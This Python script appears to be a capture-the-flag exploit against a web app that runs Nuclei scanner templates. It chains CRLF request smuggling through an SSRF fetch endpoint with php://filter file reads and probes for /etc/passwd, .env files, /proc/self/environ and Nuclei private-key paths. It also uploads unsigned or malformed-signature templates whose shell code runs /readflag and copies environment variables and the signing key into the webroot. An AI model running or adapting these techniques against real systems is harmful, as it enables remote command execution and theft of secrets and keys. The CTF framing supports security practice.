#!/usr/bin/env python3
"""
Nuclei Template Signing Bypass Techniques

The nuclei signature format is:
# digest: <signature>:<public_key_hash>

Known bypass techniques:
1. Templates from trusted paths (no signature needed)
2. Template code injection via SSTI
3. Signature verification race conditions
4. Key leak via path traversal
5. Unsigned template support (older versions)
"""

import requests
import urllib.parse
import base64
import json

TARGET = "http://50rogu0a8m01.ctfhub.io"

def fetch(endpoint):
    """Call the /api/fetch endpoint"""
    try:
        r = requests.post(f"{TARGET}/api/fetch", json={"endpoint": endpoint}, timeout=15)
        return r.text
    except Exception as e:
        return str(e)

def build_smuggled_request(method, path, headers=None, body=None):
    """Build an HTTP request smuggled through CRLF injection"""
    req = f"{method} {path} HTTP/1.1\r\n"
    req += "Host: httpd\r\n"
    
    if headers:
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
    
    if body:
        req += f"Content-Length: {len(body)}\r\n"
    else:
        req += "Content-Length: 0\r\n"
    
    req += "\r\n"
    
    if body:
        req += body
    
    return req

def encode_smuggle(first_path, second_req):
    """Encode the smuggled request for the endpoint parameter"""
    # First request just to set up the smuggle
    full = f"//{first_path} HTTP/1.1\r\nHost: httpd\r\nContent-Length: 0\r\n\r\n{second_req}"
    return urllib.parse.quote(full, safe='/')

# ============================================================================
# TECHNIQUE 1: Try to find where templates are stored and leak the key
# ============================================================================

def technique_leak_source():
    """Try to read source code to understand the signing logic"""
    print("\n[TECHNIQUE 1] Trying to leak source code...")
    
    source_files = [
        "/var/www/html/index.php",
        "/var/www/html/scanner.php", 
        "/var/www/html/pages/scanner.php",
        "/var/www/html/classes/Scanner.php",
        "/var/www/html/lib/nuclei.php",
        "/var/www/html/config.php",
        "/var/www/html/.env",
        "/app/config.php",
        "/app/.env",
        "/opt/nuclei/config.yaml",
    ]
    
    for path in source_files:
        # Try direct access
        result = fetch(f"//httpd{path}")
        if result and len(result) > 100 and "404" not in result.lower():
            print(f"[+] Found content at {path}:")
            print(result[:2000])
            return
        
        # Try via PHP include/wrapper
        b64path = base64.b64encode(path.encode()).decode()
        result = fetch(f"//httpd/index.php?page=php://filter/convert.base64-encode/resource={path}")
        if result and len(result) > 50:
            print(f"[+] LFI via php://filter at {path}:")
            try:
                decoded = base64.b64decode(result).decode()
                print(decoded[:2000])
            except:
                print(result[:500])

# ============================================================================
# TECHNIQUE 2: PHP filter chain to read files
# ============================================================================

def technique_php_filter():
    """Use PHP filter chains to read arbitrary files"""
    print("\n[TECHNIQUE 2] Trying PHP filter chain LFI...")
    
    # Common PHP LFI filter chains
    filters = [
        "php://filter/convert.base64-encode/resource=",
        "php://filter/read=string.rot13/resource=",
        "php://filter/read=convert.iconv.utf-8.utf-16/resource=",
        "phar://",
        "zip://",
        "data://text/plain;base64,",
    ]
    
    targets = [
        "index",
        "scanner", 
        "/etc/passwd",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
    ]
    
    for f in filters[:2]:  # Try first two
        for t in targets[:3]:  # Try first three
            endpoint = f"//httpd/index.php?page={urllib.parse.quote(f + t)}"
            result = fetch(endpoint)
            if result and len(result) > 20 and "error" not in result.lower()[:50]:
                print(f"[+] {f}{t} returned:")
                print(result[:500])

# ============================================================================
# TECHNIQUE 3: Nuclei key location guessing
# ============================================================================

def technique_nuclei_paths():
    """Try common nuclei key/config paths"""
    print("\n[TECHNIQUE 3] Trying nuclei key paths...")
    
    nuclei_paths = [
        "/.nuclei/keys.yaml",
        "/.nuclei/private-key.pem", 
        "/.nuclei/config.yaml",
        "/root/.nuclei/keys/private-key.pem",
        "/home/www-data/.nuclei/keys/private-key.pem",
        "/home/nuclei/.nuclei/keys/private-key.pem",
        "/var/www/.nuclei/keys/private-key.pem",
        "/opt/nuclei/keys/private-key.pem",
        "/nuclei-templates/keys/private-key.pem",
        # Try via /proc
        "/proc/self/environ",
        "/proc/self/cmdline", 
        "/proc/1/cmdline",
        "/proc/1/environ",
    ]
    
    for path in nuclei_paths:
        result = fetch(f"//httpd{path}")
        if result and len(result) > 10:
            if "PRIVATE" in result.upper() or "KEY" in result.upper() or "NUCLEI" in result.upper():
                print(f"[+] Interesting content at {path}:")
                print(result[:1000])

# ============================================================================
# TECHNIQUE 4: Try templates without signature
# ============================================================================

def technique_unsigned():
    """Try submitting unsigned templates"""
    print("\n[TECHNIQUE 4] Trying unsigned templates...")
    
    # Simple unsigned template
    template = """id: test
info:
  name: test
  author: x
  severity: info

http:
  - method: GET
    path:
      - "{{BaseURL}}"
"""
    
    # Create multipart body
    boundary = "----WebKitFormBoundary"
    body = f"------WebKitFormBoundary\r\n"
    body += f'Content-Disposition: form-data; name="yaml_file"; filename="test.yaml"\r\n'
    body += f"Content-Type: text/plain\r\n\r\n"
    body += template
    body += f"\r\n------WebKitFormBoundary--\r\n"
    
    # Smuggle the upload
    second_req = build_smuggled_request(
        "POST", 
        "/index.php?page=scanner",
        {"Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary"},
        body
    )
    
    endpoint = encode_smuggle("httpd/site/scanner", second_req)
    result = fetch(endpoint)
    print(f"[*] Unsigned template upload result: {result[:500]}")

# ============================================================================
# TECHNIQUE 5: Signature format exploits
# ============================================================================

def technique_sig_format():
    """Try malformed signatures that might bypass verification"""
    print("\n[TECHNIQUE 5] Trying signature format bypasses...")
    
    template_base = """id: getflag
info:
  name: getflag
  author: x
  severity: high
code:
  - engine:
      - sh
    source: |
      /readflag > /var/www/html/flag.txt
"""
    
    # Various signature bypass attempts
    sig_variants = [
        "",  # No signature
        "# digest: ",  # Empty signature
        "# digest: :",  # Empty parts
        "# digest: 00:00",  # Null-ish
        "# digest: AAAA:BBBB",  # Invalid format
        "# digest: skip",  # Might trigger skip logic
        "# digest: none",  # Might disable
        "# DIGEST:",  # Wrong case
        "#digest:",  # No space
        "// digest:",  # Wrong comment style
        "# digest: test:test\n# digest: real:sig",  # Double digest
    ]
    
    for sig in sig_variants[:5]:
        template = template_base + "\n" + sig
        print(f"[*] Trying signature variant: {sig[:30]}...")
        
        # Build and send the smuggled upload (simplified)
        # In reality you'd need to properly URL encode this

# ============================================================================
# TECHNIQUE 6: Look for debug/admin endpoints
# ============================================================================

def technique_debug_endpoints():
    """Find debug or admin endpoints that might help"""
    print("\n[TECHNIQUE 6] Looking for debug endpoints...")
    
    debug_paths = [
        "/debug",
        "/admin",
        "/config",
        "/phpinfo.php",
        "/info.php",
        "/.git/config",
        "/.env",
        "/robots.txt",
        "/sitemap.xml",
        "/status",
        "/health",
        "/_debug",
        "/server-status",
        "/swagger.json",
        "/api/",
        "/api/config",
    ]
    
    for path in debug_paths:
        result = fetch(f"//httpd{path}")
        if result and len(result) > 50 and "404" not in result.lower()[:100]:
            print(f"[+] Found: {path}")
            print(result[:300])

# ============================================================================
# TECHNIQUE 7: Environment variable leak via scanner itself
# ============================================================================

def technique_env_via_template():
    """Use a template that prints environment variables"""
    print("\n[TECHNIQUE 7] Trying to leak env via template execution...")
    
    # If we can get ANY template to execute, we can leak the env
    # This template tries to print all env vars
    env_template = """id: leak-env
info:
  name: leak-env
  author: x
  severity: info
code:
  - engine:
      - sh
    source: |
      env > /var/www/html/env.txt
      cat ~/.nuclei/keys/private-key.pem > /var/www/html/key.txt 2>&1
"""
    print("[*] Template to leak environment:")
    print(env_template)
    print("[*] After execution, try fetching //httpd/env.txt and //httpd/key.txt")

# ============================================================================
# TECHNIQUE 8: Try different scanner parameters
# ============================================================================

def technique_scanner_params():
    """Explore the scanner functionality with different parameters"""
    print("\n[TECHNIQUE 8] Exploring scanner parameters...")
    
    # Try various POST parameters that might exist
    params = [
        "target=http://0.0.0.0&template=",
        "target=http://0.0.0.0&yaml=",
        "target=http://0.0.0.0&url=",
        "target=http://0.0.0.0&file=",
        "target=http://0.0.0.0&config=",
        "url=http://0.0.0.0",
        "scan=true",
        "debug=true",
        "verbose=true",
        "nosign=true",
        "skip-signature=true",
        "validate=false",
    ]
    
    for param in params:
        second_req = build_smuggled_request(
            "POST",
            "/index.php?page=scanner",
            {"Content-Type": "application/x-www-form-urlencoded"},
            param
        )
        endpoint = encode_smuggle("httpd/", second_req)
        result = fetch(endpoint)
        if result and len(result) > 100:
            print(f"[*] {param[:30]}: {len(result)} bytes")
            if "error" in result.lower() or "invalid" in result.lower():
                print(f"    Error response, might be valid param")

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("Nuclei Template Signing Bypass Exploit")
    print("=" * 70)
    
    # Check connectivity
    print("\n[*] Testing connectivity...")
    result = fetch("//httpd/")
    if not result:
        print("[-] Cannot reach target")
        return
    print(f"[+] Target reachable, response: {len(result)} bytes")
    
    # Run all techniques
    technique_debug_endpoints()
    technique_leak_source()
    technique_php_filter()
    technique_nuclei_paths()
    technique_unsigned()
    technique_sig_format()
    technique_scanner_params()
    technique_env_via_template()
    
    print("\n" + "=" * 70)
    print("Additional Manual Tests:")
    print("=" * 70)
    print("""
1. Try to find the exact nuclei version:
   - Look for version info in responses
   - Check if nuclei has known CVEs for signature bypass

2. Check if templates can include other templates:
   - Use 'workflows' to chain templates
   - Reference remote templates via URL

3. Try YAML anchor/alias injection:
   - Use YAML anchors to potentially bypass signature

4. Check for SSRF in template URL:
   - template=http://your-server/template.yaml
   
5. Try path traversal in template name:
   - template=../../../tmp/unsigned.yaml

6. Look for race conditions:
   - Upload then immediately execute before signature check
""")

if __name__ == "__main__":
    main()
